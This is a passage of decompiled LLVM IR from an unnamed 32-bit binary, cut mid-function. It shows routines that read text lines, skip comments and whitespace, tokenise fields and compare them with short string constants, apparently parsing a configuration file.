  store i32 ptrtoint ([24 x i8]* @global_var_1000f8b8.322 to i32), i32* %r3.global-to-local, align 4
  store i32 268481760, i32* @lr, align 4
  %v3_1000b4dc = call i32 @function_10004f90(i32 ptrtoint ([24 x i8]* @global_var_1000f8b8.322 to i32), i32 %v0_1000b4d4)
  store i32 %v3_1000b4dc, i32* %r3.global-to-local, align 4
  store i32 %v3_1000b4dc, i32* @r26, align 4
  %v3_1000b4e0 = icmp eq i32 %v3_1000b4dc, 0
  br i1 %v3_1000b4e0, label %dec_label_pc_1000b714, label %dec_label_pc_1000b6e4.preheader

dec_label_pc_1000b6e4.preheader:                  ; preds = %dec_label_pc_1000b4b0, %dec_label_pc_1000b4d0
  %v0_1000b6f016 = phi i32 [ %v3_1000b4c4, %dec_label_pc_1000b4b0 ], [ %v3_1000b4dc, %dec_label_pc_1000b4d0 ]
  %v2_1000b6e4 = ptrtoint i32* %stack_var_-164 to i32
  %v1_1000b4f02 = bitcast i32* %stack_var_-164 to i8*
  %v3_1000b5d4 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_1000b6e4

dec_label_pc_1000b4ec:                            ; preds = %dec_label_pc_1000b504
  %v1_1000b4ec = add i32 %v0_1000b5ac9, 1
  store i32 %v1_1000b4ec, i32* %r3.global-to-local, align 4
  %v1_1000b4f0 = inttoptr i32 %v1_1000b4ec to i8*
  %v2_1000b4f0 = load i8, i8* %v1_1000b4f0, align 1
  %v3_1000b4f0 = zext i8 %v2_1000b4f0 to i32
  store i32 %v3_1000b4f0, i32* %r11.global-to-local, align 4
  %v3_1000b4f8 = icmp eq i8 %v2_1000b4f0, 0
  br i1 %v3_1000b4f8, label %dec_label_pc_1000b6e4.backedge, label %dec_label_pc_1000b504

dec_label_pc_1000b504:                            ; preds = %dec_label_pc_1000b504.lr.ph, %dec_label_pc_1000b4ec
  %v0_1000b508.in = phi i32 [ %v3_1000b4f04, %dec_label_pc_1000b504.lr.ph ], [ %v3_1000b4f0, %dec_label_pc_1000b4ec ]
  %v0_1000b51c = phi i32 [ %v3_1000b4f04, %dec_label_pc_1000b504.lr.ph ], [ %v3_1000b4f0, %dec_label_pc_1000b4ec ]
  %v0_1000b5ac9 = phi i32 [ %v2_1000b6e4, %dec_label_pc_1000b504.lr.ph ], [ %v1_1000b4ec, %dec_label_pc_1000b4ec ]
  %v0_1000b508 = mul nuw nsw i32 %v0_1000b508.in, 2
  %v2_1000b508 = add i32 %v0_1000b508, %v3_1000b504.pre
  %v3_1000b508 = inttoptr i32 %v2_1000b508 to i16*
  %v4_1000b508 = load i16, i16* %v3_1000b508, align 2
  %v1_1000b50c = and i16 %v4_1000b508, 32
  %v3_1000b50c = icmp eq i16 %v1_1000b50c, 0
  br i1 %v3_1000b50c, label %dec_label_pc_1000b514, label %dec_label_pc_1000b4ec

dec_label_pc_1000b514:                            ; preds = %dec_label_pc_1000b504
  %v3_1000b514 = icmp eq i32 %v0_1000b51c, 10
  br i1 %v3_1000b514, label %dec_label_pc_1000b6e4.backedge, label %dec_label_pc_1000b51c

dec_label_pc_1000b6e4.backedge:                   ; preds = %dec_label_pc_1000b4ec, %dec_label_pc_1000b698, %dec_label_pc_1000b6a0, %dec_label_pc_1000b6d8, %dec_label_pc_1000b4f0.preheader, %dec_label_pc_1000b514, %dec_label_pc_1000b51c, %dec_label_pc_1000b640
  %v0_1000b6f0.pre = load i32, i32* @r26, align 4
  br label %dec_label_pc_1000b6e4

dec_label_pc_1000b51c:                            ; preds = %dec_label_pc_1000b514
  %v3_1000b51c = icmp eq i32 %v0_1000b51c, 35
  br i1 %v3_1000b51c, label %dec_label_pc_1000b6e4.backedge, label %dec_label_pc_1000b524

dec_label_pc_1000b524:                            ; preds = %dec_label_pc_1000b51c
  store i32 0, i32* @r27, align 4
  store i32 %v2_1000b48c, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_1000b5ac10 = inttoptr i32 %v0_1000b5ac9 to i8*
  %v2_1000b5ac11 = load i8, i8* %v1_1000b5ac10, align 1
  %v3_1000b5b014 = icmp eq i8 %v2_1000b5ac11, 0
  br i1 %v3_1000b5b014, label %dec_label_pc_1000b5c0, label %dec_label_pc_1000b5b8

dec_label_pc_1000b538:                            ; preds = %dec_label_pc_1000b5b8
  %v1_1000b538 = mul i32 %v0_1000b538, 4
  %v3_1000b53c = load i32, i32* @global_var_1001044c, align 4
  store i32 %v3_1000b53c, i32* %r11.global-to-local, align 4
  %v1_1000b540 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000b540 = add i32 %v1_1000b540, %v1_1000b538
  %v2_1000b544 = add i32 %v2_1000b540, 16
  %v3_1000b544 = inttoptr i32 %v2_1000b544 to i32*
  store i32 %v0_1000b544, i32* %v3_1000b544, align 4
  %v0_1000b550.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b550

dec_label_pc_1000b54c:                            ; preds = %dec_label_pc_1000b564
  %v1_1000b54c = add i32 %v0_1000b54c, 1
  store i32 %v1_1000b54c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b550

dec_label_pc_1000b550:                            ; preds = %dec_label_pc_1000b538, %dec_label_pc_1000b54c
  %v0_1000b54c = phi i32 [ %v0_1000b550.pre, %dec_label_pc_1000b538 ], [ %v1_1000b54c, %dec_label_pc_1000b54c ]
  %v1_1000b550 = inttoptr i32 %v0_1000b54c to i8*
  %v2_1000b550 = load i8, i8* %v1_1000b550, align 1
  %v3_1000b554 = icmp eq i8 %v2_1000b550, 0
  br i1 %v3_1000b554, label %dec_label_pc_1000b580, label %dec_label_pc_1000b564

dec_label_pc_1000b564:                            ; preds = %dec_label_pc_1000b550
  %v3_1000b55c = icmp eq i8 %v2_1000b550, 10
  %v3_1000b550 = zext i8 %v2_1000b550 to i32
  %v1_1000b558 = mul nuw nsw i32 %v3_1000b550, 2
  %v1_1000b564 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000b564 = add i32 %v1_1000b564, %v1_1000b558
  %v3_1000b564 = inttoptr i32 %v2_1000b564 to i16*
  %v4_1000b564 = load i16, i16* %v3_1000b564, align 2
  %v1_1000b568 = and i16 %v4_1000b564, 32
  %v3_1000b568.not = icmp ne i16 %v1_1000b568, 0
  %brmerge = or i1 %v3_1000b55c, %v3_1000b568.not
  br i1 %brmerge, label %dec_label_pc_1000b580, label %dec_label_pc_1000b54c

dec_label_pc_1000b578:                            ; preds = %dec_label_pc_1000b594
  %v0_1000b578 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000b578 = trunc i32 %v0_1000b578 to i8
  store i8 %v1_1000b578, i8* %v1_1000b580, align 1
  %v0_1000b57c = load i32, i32* %r3.global-to-local, align 4
  %v1_1000b57c = add i32 %v0_1000b57c, 1
  store i32 %v1_1000b57c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b580

dec_label_pc_1000b580:                            ; preds = %dec_label_pc_1000b564, %dec_label_pc_1000b550, %dec_label_pc_1000b578
  %v0_1000b5ac = phi i32 [ %v1_1000b57c, %dec_label_pc_1000b578 ], [ %v0_1000b54c, %dec_label_pc_1000b550 ], [ %v0_1000b54c, %dec_label_pc_1000b564 ]
  %v1_1000b580 = inttoptr i32 %v0_1000b5ac to i8*
  %v2_1000b580 = load i8, i8* %v1_1000b580, align 1
  %v3_1000b580 = zext i8 %v2_1000b580 to i32
  %v3_1000b584 = icmp eq i8 %v2_1000b580, 0
  %v1_1000b588 = mul nuw nsw i32 %v3_1000b580, 2
  store i32 %v1_1000b588, i32* %r11.global-to-local, align 4
  br i1 %v3_1000b584, label %dec_label_pc_1000b5a8, label %dec_label_pc_1000b594

dec_label_pc_1000b594:                            ; preds = %dec_label_pc_1000b580
  %v3_1000b58c = icmp eq i8 %v2_1000b580, 10
  %v3_1000b594 = load i32, i32* @global_var_1001044c, align 4
  %v2_1000b598 = add i32 %v3_1000b594, %v1_1000b588
  %v3_1000b598 = inttoptr i32 %v2_1000b598 to i16*
  %v4_1000b598 = load i16, i16* %v3_1000b598, align 2
  %v1_1000b59c = and i16 %v4_1000b598, 32
  %v3_1000b59c.not = icmp ne i16 %v1_1000b59c, 0
  %brmerge27 = or i1 %v3_1000b58c, %v3_1000b59c.not
  br i1 %brmerge27, label %dec_label_pc_1000b578, label %dec_label_pc_1000b5a8

dec_label_pc_1000b5a8:                            ; preds = %dec_label_pc_1000b594, %dec_label_pc_1000b580
  %v0_1000b5a8 = load i32, i32* @r27, align 4
  %v1_1000b5a8 = add i32 %v0_1000b5a8, 1
  store i32 %v1_1000b5a8, i32* @r27, align 4
  %v2_1000b5ac = load i8, i8* %v1_1000b580, align 1
  %v3_1000b5b0 = icmp eq i8 %v2_1000b5ac, 0
  br i1 %v3_1000b5b0, label %dec_label_pc_1000b5c0, label %dec_label_pc_1000b5b8

dec_label_pc_1000b5b8:                            ; preds = %dec_label_pc_1000b524, %dec_label_pc_1000b5a8
  %v0_1000b544 = phi i32 [ %v0_1000b5ac, %dec_label_pc_1000b5a8 ], [ %v0_1000b5ac9, %dec_label_pc_1000b524 ]
  %v0_1000b538 = phi i32 [ %v1_1000b5a8, %dec_label_pc_1000b5a8 ], [ 0, %dec_label_pc_1000b524 ]
  %tmp33 = icmp slt i32 %v0_1000b538, 5
  br i1 %tmp33, label %dec_label_pc_1000b538, label %dec_label_pc_1000b5c0

dec_label_pc_1000b5c0:                            ; preds = %dec_label_pc_1000b5a8, %dec_label_pc_1000b5b8, %dec_label_pc_1000b524
  store i32 %tmp, i32* @r30, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1000f8d0.323 to i32), i32* @r4, align 4
  store i32 1, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v4_1000b5d4 = call i32 @function_10007234(i8* %v3_1000b5d4, i32 ptrtoint ([11 x i8]* @global_var_1000f8d0.323 to i32))
  store i32 %v4_1000b5d4, i32* %r3.global-to-local, align 4
  %v3_1000b5d8 = icmp eq i32 %v4_1000b5d4, 0
  br i1 %v3_1000b5d8, label %dec_label_pc_1000b604, label %dec_label_pc_1000b628

dec_label_pc_1000b5e4:                            ; preds = %dec_label_pc_1000b61c
  %v1_1000b5e4 = add i32 %v2_1000b60c, 24
  %v2_1000b5e4 = inttoptr i32 %v1_1000b5e4 to i32*
  %v3_1000b5e4 = load i32, i32* %v2_1000b5e4, align 4
  store i32 %v3_1000b5e4, i32* %r3.global-to-local, align 4
  store i32 268482028, i32* @lr, align 4
  %v1_1000b5e8 = call i32 @function_10007760(i32 %v3_1000b5e4)
  store i32 %v1_1000b5e8, i32* %r3.global-to-local, align 4
  %v0_1000b5f0 = load i32, i32* @r29, align 4
  %v1_1000b5f0 = add i32 %v0_1000b5f0, 1
  store i32 %v1_1000b5f0, i32* %r11.global-to-local, align 4
  %v1_1000b5f4 = mul i32 %v0_1000b5f0, 4
  store i32 %v1_1000b5f0, i32* @global_var_100104c8.262, align 4
  %v3_1000b600 = add i32 %v1_1000b5f4, ptrtoint (i32* @global_var_10012d4c.263 to i32)
  %v4_1000b600 = inttoptr i32 %v3_1000b600 to i32*
  store i32 %v1_1000b5e8, i32* %v4_1000b600, align 4
  br label %dec_label_pc_1000b604

dec_label_pc_1000b604:                            ; preds = %dec_label_pc_1000b5c0, %dec_label_pc_1000b5e4
  %v0_1000b604 = load i32, i32* @r31, align 4
  %v1_1000b604 = load i32, i32* @r27, align 4
  %v2_1000b604 = icmp slt i32 %v0_1000b604, %v1_1000b604
  %v1_1000b608 = mul i32 %v0_1000b604, 4
  %v0_1000b60c = load i32, i32* @r1, align 4
  %v2_1000b60c = add i32 %v0_1000b60c, %v1_1000b608
  br i1 %v2_1000b604, label %dec_label_pc_1000b61c, label %dec_label_pc_1000b628

dec_label_pc_1000b61c:                            ; preds = %dec_label_pc_1000b604
  %v3_1000b61c = load i32, i32* @global_var_100104c8.262, align 4
  %tmp35 = icmp slt i32 %v3_1000b61c, 3
  br i1 %tmp35, label %dec_label_pc_1000b5e4, label %dec_label_pc_1000b628

dec_label_pc_1000b628:                            ; preds = %dec_label_pc_1000b61c, %dec_label_pc_1000b604, %dec_label_pc_1000b5c0
  %v0_1000b62c = load i32, i32* @r30, align 4
  store i32 %v0_1000b62c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1000f8dc.324 to i32), i32* @r4, align 4
  %v3_1000b634 = inttoptr i32 %v0_1000b62c to i8*
  %v4_1000b634 = call i32 @function_10007234(i8* %v3_1000b634, i32 ptrtoint ([7 x i8]* @global_var_1000f8dc.324 to i32))
  store i32 %v4_1000b634, i32* %r3.global-to-local, align 4
  %v3_1000b638 = icmp eq i32 %v4_1000b634, 0
  br i1 %v3_1000b638, label %dec_label_pc_1000b678.preheader, label %dec_label_pc_1000b640

dec_label_pc_1000b640:                            ; preds = %dec_label_pc_1000b628
  %v0_1000b644 = load i32, i32* @r30, align 4
  store i32 %v0_1000b644, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1000f8e4.325 to i32), i32* @r4, align 4
  %v3_1000b64c = inttoptr i32 %v0_1000b644 to i8*
  %v4_1000b64c = call i32 @function_10007234(i8* %v3_1000b64c, i32 ptrtoint ([7 x i8]* @global_var_1000f8e4.325 to i32))
  store i32 %v4_1000b64c, i32* %r3.global-to-local, align 4
  %v3_1000b650 = icmp eq i32 %v4_1000b64c, 0
  br i1 %v3_1000b650, label %dec_label_pc_1000b678.preheader, label %dec_label_pc_1000b6e4.backedge

dec_label_pc_1000b678.preheader:                  ; preds = %dec_label_pc_1000b628, %dec_label_pc_1000b640
  store i32 ptrtoint (i32* @global_var_10012d3c.312 to i32), i32* @r31, align 4
  %v3_1000b68441 = load i32, i32* @global_var_100104cc.310, align 4
  %v2_1000b68843 = icmp sgt i32 %v3_1000b68441, 0
  %v1_1000b68c45 = add i32 %v3_1000b68441, -1
  %v1_1000b69046 = mul i32 %v1_1000b68c45, 4
  store i32 %v1_1000b69046, i32* %r11.global-to-local, align 4
  br i1 %v2_1000b68843, label %dec_label_pc_1000b65c, label %dec_label_pc_1000b698

dec_label_pc_1000b65c:                            ; preds = %dec_label_pc_1000b678.preheader, %dec_label_pc_1000b65c
  %v1_1000b69048 = phi i32 [ %v1_1000b690, %dec_label_pc_1000b65c ], [ %v1_1000b69046, %dec_label_pc_1000b678.preheader ]
  %v1_1000b68c47 = phi i32 [ %v1_1000b68c, %dec_label_pc_1000b65c ], [ %v1_1000b68c45, %dec_label_pc_1000b678.preheader ]
  %v2_1000b65c = add i32 %v1_1000b69048, ptrtoint (i32* @global_var_10012d3c.312 to i32)
  %v3_1000b65c = inttoptr i32 %v2_1000b65c to i32*
  %v4_1000b65c = load i32, i32* %v3_1000b65c, align 4
  store i32 %v4_1000b65c, i32* @r3, align 4
  store i32 %v1_1000b68c47, i32* @global_var_100104cc.310, align 4
  store i32 268482152, i32* @lr, align 4
  %v0_1000b664 = call i32 @function_100081f8()
  store i32 %v0_1000b664, i32* %r3.global-to-local, align 4
  %v3_1000b668 = load i32, i32* @global_var_100104cc.310, align 4
  %v1_1000b670 = mul i32 %v3_1000b668, 4
  %v1_1000b674 = load i32, i32* @r31, align 4
  %v3_1000b674 = add i32 %v1_1000b674, %v1_1000b670
  %v4_1000b674 = inttoptr i32 %v3_1000b674 to i32*
  store i32 0, i32* %v4_1000b674, align 4
  store i32 ptrtoint (i32* @global_var_10012d3c.312 to i32), i32* @r31, align 4
  %v3_1000b684 = load i32, i32* @global_var_100104cc.310, align 4
  %v2_1000b688 = icmp sgt i32 %v3_1000b684, 0
  %v1_1000b68c = add i32 %v3_1000b684, -1
  %v1_1000b690 = mul i32 %v1_1000b68c, 4
  store i32 %v1_1000b690, i32* %r11.global-to-local, align 4
  br i1 %v2_1000b688, label %dec_label_pc_1000b65c, label %dec_label_pc_1000b698

dec_label_pc_1000b698:                            ; preds = %dec_label_pc_1000b65c, %dec_label_pc_1000b678.preheader
  %v3_1000b6d859 = phi i32 [ %v3_1000b68441, %dec_label_pc_1000b678.preheader ], [ %v3_1000b684, %dec_label_pc_1000b65c ]
  %v1_1000b6c049 = load i32, i32* @r27, align 4
  %v2_1000b6c050 = icmp sgt i32 %v1_1000b6c049, 1
  %v0_1000b6c853 = load i32, i32* @r1, align 4
  %v2_1000b6c854 = add i32 %v0_1000b6c853, 4
  br i1 %v2_1000b6c050, label %dec_label_pc_1000b6d8, label %dec_label_pc_1000b6e4.backedge

dec_label_pc_1000b6a0:                            ; preds = %dec_label_pc_1000b6d8
  %v1_1000b6a0 = add i32 %v2_1000b6c855, 24
  %v2_1000b6a0 = inttoptr i32 %v1_1000b6a0 to i32*
  %v3_1000b6a0 = load i32, i32* %v2_1000b6a0, align 4
  store i32 %v3_1000b6a0, i32* %r3.global-to-local, align 4
  store i32 268482216, i32* @lr, align 4
  %v1_1000b6a4 = call i32 @function_10007760(i32 %v3_1000b6a0)
  store i32 %v1_1000b6a4, i32* %r3.global-to-local, align 4
  %v0_1000b6ac = load i32, i32* @r29, align 4
  %v1_1000b6ac = add i32 %v0_1000b6ac, 1
  store i32 %v1_1000b6ac, i32* %r11.global-to-local, align 4
  %v1_1000b6b0 = mul i32 %v0_1000b6ac, 4
  store i32 %v1_1000b6ac, i32* @global_var_100104cc.310, align 4
  %v3_1000b6bc = add i32 %v1_1000b6b0, ptrtoint (i32* @global_var_10012d3c.312 to i32)
  %v4_1000b6bc = inttoptr i32 %v3_1000b6bc to i32*
  store i32 %v1_1000b6a4, i32* %v4_1000b6bc, align 4
  %v0_1000b6c0.pre = load i32, i32* @r31, align 4
  %v1_1000b6c0 = load i32, i32* @r27, align 4
  %v2_1000b6c0 = icmp slt i32 %v0_1000b6c0.pre, %v1_1000b6c0
  br i1 %v2_1000b6c0, label %dec_label_pc_1000b6a0.dec_label_pc_1000b6d8_crit_edge, label %dec_label_pc_1000b6e4.backedge

dec_label_pc_1000b6a0.dec_label_pc_1000b6d8_crit_edge: ; preds = %dec_label_pc_1000b6a0
  %v0_1000b6c8 = load i32, i32* @r1, align 4
  %v1_1000b6c4 = mul i32 %v0_1000b6c0.pre, 4
  %v2_1000b6c8 = add i32 %v0_1000b6c8, %v1_1000b6c4
  %v3_1000b6d8.pre = load i32, i32* @global_var_100104cc.310, align 4
  br label %dec_label_pc_1000b6d8

dec_label_pc_1000b6d8:                            ; preds = %dec_label_pc_1000b698, %dec_label_pc_1000b6a0.dec_label_pc_1000b6d8_crit_edge
  %v3_1000b6d8 = phi i32 [ %v3_1000b6d8.pre, %dec_label_pc_1000b6a0.dec_label_pc_1000b6d8_crit_edge ], [ %v3_1000b6d859, %dec_label_pc_1000b698 ]
  %v2_1000b6c855 = phi i32 [ %v2_1000b6c8, %dec_label_pc_1000b6a0.dec_label_pc_1000b6d8_crit_edge ], [ %v2_1000b6c854, %dec_label_pc_1000b698 ]
  %tmp37 = icmp slt i32 %v3_1000b6d8, 4
  br i1 %tmp37, label %dec_label_pc_1000b6a0, label %dec_label_pc_1000b6e4.backedge

dec_label_pc_1000b6e4:                            ; preds = %dec_label_pc_1000b6e4.backedge, %dec_label_pc_1000b6e4.preheader
  %v0_1000b6f0 = phi i32 [ %v0_1000b6f0.pre, %dec_label_pc_1000b6e4.backedge ], [ %v0_1000b6f016, %dec_label_pc_1000b6e4.preheader ]
  store i32 %v2_1000b6e4, i32* %r3.global-to-local, align 4
  store i32 268482296, i32* @lr, align 4
  %v3_1000b6f4 = call i32 @function_10006950(i32 %v2_1000b6e4, i32 128, i32 %v0_1000b6f0)
  store i32 %v3_1000b6f4, i32* %r3.global-to-local, align 4
  %v3_1000b6f8 = icmp eq i32 %v3_1000b6f4, 0
  br i1 %v3_1000b6f8, label %dec_label_pc_1000b708, label %dec_label_pc_1000b4f0.preheader

dec_label_pc_1000b4f0.preheader:                  ; preds = %dec_label_pc_1000b6e4
  store i32 %v2_1000b6e4, i32* %r3.global-to-local, align 4
  %v2_1000b4f03 = load i8, i8* %v1_1000b4f02, align 4
  %v3_1000b4f04 = zext i8 %v2_1000b4f03 to i32
  store i32 %v3_1000b4f04, i32* %r11.global-to-local, align 4
  %v3_1000b4f86 = icmp eq i8 %v2_1000b4f03, 0
  br i1 %v3_1000b4f86, label %dec_label_pc_1000b6e4.backedge, label %dec_label_pc_1000b504.lr.ph

dec_label_pc_1000b504.lr.ph:                      ; preds = %dec_label_pc_1000b4f0.preheader
  %v3_1000b504.pre = load i32, i32* @global_var_1001044c, align 4
  br label %dec_label_pc_1000b504

dec_label_pc_1000b708:                            ; preds = %dec_label_pc_1000b6e4
  %v0_1000b708 = load i32, i32* @r26, align 4
  store i32 %v0_1000b708, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000b710.326 to i32), i32* @lr, align 4
  %v1_1000b70c = inttoptr i32 %v0_1000b708 to i16*
  %v2_1000b70c = call i32 @function_10004e44(i16* %v1_1000b70c)
  store i32 %v2_1000b70c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b720

dec_label_pc_1000b714:                            ; preds = %dec_label_pc_1000b4d0
  %v0_1000b714 = call i32 @function_10009ac4()
  store i32 %v0_1000b714, i32* %r3.global-to-local, align 4
  %v2_1000b71c = inttoptr i32 %v0_1000b714 to i32*
  store i32 3, i32* %v2_1000b71c, align 4
  br label %dec_label_pc_1000b720

dec_label_pc_1000b720:                            ; preds = %dec_label_pc_1000b46c, %dec_label_pc_1000b708, %dec_label_pc_1000b714
  store i32 %v2_1000b48c, i32* @r3, align 4
  %v0_1000b728 = call i32 @function_10009200()
  store i32 %v0_1000b728, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000b728

; uselistorder directives
  uselistorder i32 %v3_1000b4f04, { 2, 0, 1 }
  uselistorder i32 %v1_1000b69046, { 1, 0 }
  uselistorder i32 %v1_1000b68c45, { 1, 0 }
  uselistorder i32 %v0_1000b538, { 1, 0 }
  uselistorder i32 %v1_1000b588, { 1, 0 }
  uselistorder i8* %v1_1000b580, { 0, 2, 1 }
  uselistorder i8 %v2_1000b550, { 2, 0, 1 }
  uselistorder i32 %v0_1000b54c, { 0, 1, 3, 2 }
  uselistorder i32 %v3_1000b4f0, { 1, 0, 2 }
  uselistorder i32 %v1_1000b4ec, { 0, 2, 1 }
  uselistorder i32 %v2_1000b6e4, { 1, 3, 2, 0 }
  uselistorder i32 %v2_1000b48c, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 28, 18, 19, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 26, 17, 27, 0, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* %r11.global-to-local, { 8, 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i32 ()* @function_10009ac4, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32 ()* @function_100081f8, { 20, 19, 18, 17, 16, 15, 14, 13, 7, 6, 12, 11, 10, 9, 8, 3, 2, 22, 21, 1, 5, 4, 24, 23, 0 }
  uselistorder i32* @global_var_100104cc.310, { 0, 2, 3, 4, 5, 1, 6, 7, 8 }
  uselistorder i32 ptrtoint (i32* @global_var_10012d3c.312 to i32), { 3, 5, 1, 0, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_10012d4c.263 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_100103e0.261 to i32), { 0, 2, 3, 4, 1, 5 }
  uselistorder label %dec_label_pc_1000b720, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b6d8, { 1, 0 }
  uselistorder label %dec_label_pc_1000b65c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b678.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000b604, { 1, 0 }
  uselistorder label %dec_label_pc_1000b5c0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000b5b8, { 1, 0 }
  uselistorder label %dec_label_pc_1000b580, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b550, { 1, 0 }
  uselistorder label %dec_label_pc_1000b6e4.backedge, { 4, 3, 2, 1, 7, 6, 5, 0 }
  uselistorder label %dec_label_pc_1000b6e4.preheader, { 1, 0 }
}

define i32 @function_1000b740(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_1000b740:
  %stack_var_0 = alloca i32, align 4
  %v4_1000b744 = ptrtoint i32* %stack_var_0 to i32
  store i32 %arg6, i32* @r10, align 4
  store i32 %arg5, i32* @r29, align 4
  store i32 268482436, i32* @lr, align 4
  %v9_1000b780 = inttoptr i32 %arg3 to i32*
  %v10_1000b780 = call i32 @function_1000cbe0(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_1000b780, i32 %arg4, i32 %arg5, i32 %v4_1000b744, i32 %arg7)
  ret i32 %v10_1000b780
}

define i32 @function_1000b798(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000b798:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000b7ac = ptrtoint i32* %stack_var_-24 to i32
  store i32 268482496, i32* @lr, align 4
  %v2_1000b7bc = call i32 @function_10009560(i32 9, i32 %v2_1000b7ac)
  ret i32 %v2_1000b7bc

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_10009560, { 6, 4, 8, 7, 3, 2, 5, 1, 0 }
}

define i32 @function_1000b7d0(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000b7d0:
  %r0.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_1000b7d4 = load i32, i32* @lr, align 4
  store i32 %v0_1000b7d4, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000b7e0 = icmp eq i32* %arg2, null
  store i32 %arg3, i32* %r30.global-to-local, align 4
  %v1_1000b7f0 = add i32 %tmp, 4
  store i32 %v1_1000b7f0, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  %v2_1000b7f8 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %v2_1000b7f8, i32* @r3, align 4
  br i1 %v3_1000b7e0, label %dec_label_pc_1000b820, label %dec_label_pc_1000b800

dec_label_pc_1000b800:                            ; preds = %dec_label_pc_1000b7d0
  %v2_1000b800 = load i32, i32* %arg2, align 4
  store i32 %v2_1000b800, i32* %r0.global-to-local, align 4
  store i32 268482572, i32* @lr, align 4
  %v0_1000b808 = call i32 @function_10007108()
  %v0_1000b80c = load i32, i32* @r31, align 4
  %v1_1000b80c = add i32 %v0_1000b80c, 132
  %v2_1000b80c = inttoptr i32 %v1_1000b80c to i32*
  %v3_1000b80c = load i32, i32* %v2_1000b80c, align 4
  store i32 %v3_1000b80c, i32* %r0.global-to-local, align 4
  %v1_1000b818 = add i32 %v0_1000b80c, 136
  %v2_1000b818 = inttoptr i32 %v1_1000b818 to i32*
  %v3_1000b818 = load i32, i32* %v2_1000b818, align 4
  store i32 %v3_1000b818, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000b820

dec_label_pc_1000b820:                            ; preds = %dec_label_pc_1000b7d0, %dec_label_pc_1000b800
  store i32 268482624, i32* @lr, align 4
  %v0_1000b83c = call i32 @function_1000bae0()
  %v0_1000b840 = load i32, i32* %r30.global-to-local, align 4
  %v3_1000b840 = icmp eq i32 %v0_1000b840, 0
  store i32 %v0_1000b83c, i32* @r31, align 4
  br i1 %v3_1000b840, label %dec_label_pc_1000b87c, label %dec_label_pc_1000b850

dec_label_pc_1000b850:                            ; preds = %dec_label_pc_1000b820
  %v1_1000b848 = icmp slt i32 %v0_1000b83c, 0
  %v1_1000b850 = add i32 %v0_1000b840, 4
  store i32 %v1_1000b850, i32* @r3, align 4
  %v2_1000b854 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_1000b854, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  br i1 %v1_1000b848, label %dec_label_pc_1000b87c, label %dec_label_pc_1000b860

dec_label_pc_1000b860:                            ; preds = %dec_label_pc_1000b850
  %v3_1000b860 = load i32, i32* %stack_var_-172, align 4
  store i32 %v3_1000b860, i32* %r0.global-to-local, align 4
  %v2_1000b864 = inttoptr i32 %v0_1000b840 to i32*
  store i32 %v3_1000b860, i32* %v2_1000b864, align 4
  store i32 268482668, i32* @lr, align 4
  %v0_1000b868 = call i32 @function_10007108()
  %v1_1000b874 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000b874 = add i32 %v1_1000b874, 136
  %v3_1000b874 = inttoptr i32 %v2_1000b874 to i32*
  %v0_1000b878 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b878 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000b878 = add i32 %v1_1000b878, 132
  %v3_1000b878 = inttoptr i32 %v2_1000b878 to i32*
  store i32 %v0_1000b878, i32* %v3_1000b878, align 4
  %v0_1000b880.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000b87c

dec_label_pc_1000b87c:                            ; preds = %dec_label_pc_1000b850, %dec_label_pc_1000b820, %dec_label_pc_1000b860
  %v0_1000b880 = phi i32 [ %v0_1000b83c, %dec_label_pc_1000b850 ], [ %v0_1000b83c, %dec_label_pc_1000b820 ], [ %v0_1000b880.pre, %dec_label_pc_1000b860 ]
  store i32 %v0_1000b7d4, i32* %r0.global-to-local, align 4
